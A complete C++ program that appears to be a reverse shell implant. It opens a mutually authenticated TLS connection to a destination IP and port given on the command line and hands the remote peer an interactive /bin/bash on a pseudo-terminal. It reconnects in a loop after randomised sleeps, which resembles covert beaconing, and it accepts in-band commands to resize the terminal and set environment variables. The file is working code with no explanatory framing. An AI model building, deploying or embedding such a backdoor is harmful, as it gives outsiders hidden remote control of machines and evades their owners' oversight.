#include <iostream>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <poll.h>
#include <unistd.h>
#include <termios.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <iomanip>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/wait.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
using namespace std;
const int LEN=256*256, SLEEP=120;
int fd=-1;
void process_command(char*,int);
void print_hex(char *data, int len);
int master=-1;
int child=-1;
void handle_child(int sig);
int main(int argc, char ** argv) try {
  int ret;
  if (argc<6) throw string(argv[0])+" CA.pem cert.pem key.pem destIP destPORT [client name]";
  const int MAX_NAME=100;
  unsigned char expected_common_name[MAX_NAME]={};
  bool check_name=false;
  if (argc>6) {
    strncpy(reinterpret_cast<char*>(expected_common_name),argv[6],MAX_NAME);
    check_name=true;
    }
  char recv_buffer[LEN];
  char send_buffer[LEN];
  char command_buffer[LEN];
  signal(SIGCHLD,handle_child);
//
// SSL:
//
  SSL_CTX *ctx=SSL_CTX_new(TLS_client_method());
  if (!ctx) throw "NULL CTX returned";
  if (!SSL_CTX_set_min_proto_version(ctx,TLS1_2_VERSION)) throw "SSL_CTX_set_min_proto_version";
  if (SSL_CTX_load_verify_locations(ctx,argv[1],NULL)!=1) throw "SSL_CTX_load_verify_locations";
  if (SSL_CTX_use_certificate_file(ctx,argv[2],SSL_FILETYPE_PEM)!=1) throw "SSL_CTX_use_certificate_file";
  if (SSL_CTX_use_PrivateKey_file(ctx,argv[3],SSL_FILETYPE_PEM)!=1) throw "SSL_CTX_use_PrivateKey_file";
  SSL_CTX_set_verify(ctx,SSL_VERIFY_PEER|SSL_VERIFY_FAIL_IF_NO_PEER_CERT,NULL);
  SSL_CTX_set_verify_depth(ctx,0);
  SSL *ssl=SSL_new(ctx);
  if (ssl==NULL) throw "SSL_new";
//
  sockaddr_in addr;
  addr.sin_family=AF_INET;
  addr.sin_port=htons(atoi(argv[5]));
  addr.sin_addr.s_addr=inet_addr(argv[4]);
  int pid=-1;
  int rnd;
  if ((rnd=open("/dev/urandom",O_RDONLY))<0) {
    perror("open");
    throw "open";
    }
  for (;;) {
  if (pid>0) {
    int wstatus,x;
    if ((x=waitpid(-1,&wstatus,WNOHANG))>0) {
      cout << "Process returned with status " << wstatus << " " << x <<  endl;
      }
    }
  int rec=0;
  bool newline=false;
  bool command=false;
  int cmd_len=0;
  winsize wins={30,100};
//SSL_clear(ssl);
  pid=fork();
  if (pid) {
//  close(fd);
    unsigned int random=SLEEP;
    read(rnd,&random,sizeof(random));
    unsigned int sl=random%SLEEP;
    if (sl<10) sl=10;
    cout << "Sleep time " << sl << endl;
    while (sl) {
      sl=sleep(sl);
      if (sl) cout << "remain... " << sl << endl;
    }
    continue;
    }
// continue in child:
  bool shell_started=false;
  fd=socket(AF_INET,SOCK_STREAM,0);
  int yes=1;
  int idle=600;
  if (setsockopt(fd,SOL_SOCKET,SO_KEEPALIVE,&yes,sizeof(yes))) {
    perror("setsockopt SO_KEEPALIVE");
    goto cnt;
    }
  if (connect(fd,reinterpret_cast<sockaddr*>(&addr),sizeof(addr))<0) {
    perror("connect");
    goto cnt;
    }
  if (setsockopt(fd,IPPROTO_TCP,TCP_KEEPIDLE,&idle,sizeof(idle))) {
    perror("setsockopt TCP_KEEPIDLE");
    goto cnt;
    }

// SSL:
//
  if (SSL_set_fd(ssl,fd)!=1) {
    cerr << "SSL_set_fd" << endl;
    close(fd);
    goto cnt;
    }
  if ((ret=SSL_connect(ssl))!=1) {
    cerr << SSL_get_error(ssl,ret) << endl;
    ERR_print_errors_fp(stdout);
    cerr << "SSL_connect" << endl;
    goto cnt;
    }
  if (SSL_get_verify_result(ssl)!=X509_V_OK) {
    cerr << "SSL_get_verify_result" << endl;
    goto cnt;
    }
  {
  X509 *cert=SSL_get_peer_certificate(ssl);
  if (!cert) {
    cerr << "SSL_get_peer_certificate" << endl;
    goto cnt;
    }
  X509_NAME *name=X509_get_subject_name(cert);
  int i=X509_NAME_get_index_by_NID(name,NID_commonName,-1);
  const unsigned char *common_name=ASN1_STRING_get0_data(X509_NAME_ENTRY_get_data(X509_NAME_get_entry(name,i)));
  cout << "Peer common name: " << common_name << endl;
  if (check_name && string(reinterpret_cast<const char*>(common_name))!=string(reinterpret_cast<const char*>(expected_common_name))) {
    cerr << "names do not match" << endl;
    goto cnt;
    }
  cout << "current cipher: " << SSL_CIPHER_standard_name(SSL_get_current_cipher(ssl)) << endl;
  }
//

  master=getpt();
  if (master<0) {
    perror("getpt");
    goto cnt;
    }
  if (grantpt(master)<0) {
    perror("grantpt");
    goto cnt;
    }
  if (unlockpt(master)<0) {
    perror("unlockpt");
    goto cnt;
    }
// shell was started here
  pollfd fds[2];
  fds[0].fd=master;
  fds[0].events=POLLIN|POLLHUP|POLLERR|POLLRDHUP;
  fds[1].fd=fd;
  fds[1].events=POLLIN|POLLHUP|POLLERR|POLLRDHUP;
  ioctl(master,TIOCSWINSZ,&wins);
  for (;;) {
    rec=poll(fds,2,-1);
    for (int i=0;i<2;++i) {
      if ((fds[i].revents&POLLHUP)!=0) {
        cout << "Received POLLHUP on " << i << endl;
        goto cnt;
        }
      if ((fds[i].revents&POLLERR)!=0) {
        cout << "Received POLLERR on " << i << endl;
        goto cnt;
        }
      if ((fds[i].revents&POLLRDHUP)!=0) {
        cout << "Received POLLRDHUP on " << i << endl;
        goto cnt;
        }
      if ((fds[i].revents&POLLIN)!=0) {
        if (i) {
          if ((rec=SSL_read(ssl,recv_buffer,LEN))<=0) {
            ERR_print_errors_fp(stdout);
            cerr << "SSL_read 1" << endl;
            goto cnt;
            }
          }
        else {
          if ((rec=read(fds[i].fd,recv_buffer,LEN))<=0) {
            perror("recv");
            cerr << "Error recv" << endl;
            goto cnt;
            }
          }
        if (fds[i].fd==fd) { //look for commands
          int jj=0;
          for (int j=0;j<rec;++j) {
            bool skip=false;
            if (command && recv_buffer[j]=='~') {
              command=false;
              skip=true;
              for (int k=0;k<cmd_len;++k) cout << command_buffer[k];
              process_command(command_buffer,cmd_len);
              cout << endl;
              cmd_len=0;
              }
            if (newline && recv_buffer[j]=='~') {
              command=true;
              if (jj>0) --jj;
              }
            if (recv_buffer[j]=='\r') newline=true;
            else                      newline=false;
            if (cmd_len>=LEN) {
              throw "command buffer overflow, hostile peer";
              }
            if (command && recv_buffer[j]!='~') command_buffer[cmd_len++]=recv_buffer[j];
            if (!command && !skip) send_buffer[jj++]=recv_buffer[j];
            }
          rec=jj;
          }
        else {
          for (int j=0;j<rec;++j) send_buffer[j]=recv_buffer[j];
          }
        if (rec>0) {
          if (i) {
            if (!shell_started) {
              shell_started=true;
              child=fork();
              if (child==0) {
                cout << "Starting shell.." << endl;
                close(0);
                close(1);
                close(2);
                close(fd);
                int fd=open(ptsname(master),O_RDWR);
                if (fd!=0) throw "open master";
                dup(fd);
                dup(fd);
                setsid();
                signal(SIGPIPE,SIG_DFL);
                execl("/bin/bash","-bash",NULL);
                }
              }
            rec=write(fds[!i].fd,send_buffer,rec);
            if (rec<0) {
              perror("write");
              cerr << "write" << endl;
              goto cnt;
              }
            }
          else {
            rec=SSL_write(ssl,send_buffer,rec);
            if (rec<0) {
              cerr << "SSL_write" << endl;
              goto cnt;
              }
            }
          }
        }
      }
    }
cnt:
  SSL_shutdown(ssl);
  if (fd>0) close(fd);
  fd=-1;
  if (master>0) close(master);
  master=-1;
  if (child>0) waitpid(child,NULL,WNOHANG);
  child=-1;
  break;
  } // for (;;)
//send(fd,"aaaa",4,0);
  } catch (const char * x) {
  cout << x << endl;
  shutdown(fd,SHUT_RDWR);
  } catch (const string &x) {
  cout << x << endl;
  shutdown(fd,SHUT_RDWR);
  }
//
void process_command(char* command,int len) {
  if (len>=LEN) throw "len error";
  command[len]=0;
  unsigned short a,b;
  char cmd[len],par1[len],par2[len];
  int ret;
  ret=sscanf(command,"%s%hd%hd",cmd,&a,&b);
  if (string(cmd)=="size" && ret==3) {
    winsize wins={b,a};
    ioctl(master,TIOCSWINSZ,&wins);
    cout << "\nsize: " << a << "x" << b << endl;
    }
  ret=sscanf(command,"%s%s%s",cmd,par1,par2);
  if (string(cmd)=="env" && ret==3) {
    if (setenv(par1,par2,1)<0) {
      perror("setenv");
      }
    cout << "\nenv: " << par1 << "=" << par2 << endl;
    }
  }
void print_hex(char *data, int len) {
  cout << hex << setfill('0');
  cout << setw(3) << dec << 0 << hex << "  ";
  for (int i=0;i<len;++i) {
    cout << setw(2) << (int) data[i];
    if ((i+1)%16==0) { 
      cout << endl;
      cout << setw(3) << dec << i/16 << hex << "  ";
      }
    else if ((i+1)%8==0) cout << " | ";
    else cout << " ";
    }
  cout << dec << setfill(' ') << endl;
  cout << "--" << endl;
}
void handle_child(int sig) {
  int wstatus,x;
  if ((x=waitpid(-1,&wstatus,WNOHANG))>0) {
    cout << "Process returned with status " << wstatus << " " << x <<  endl;
    }
  }
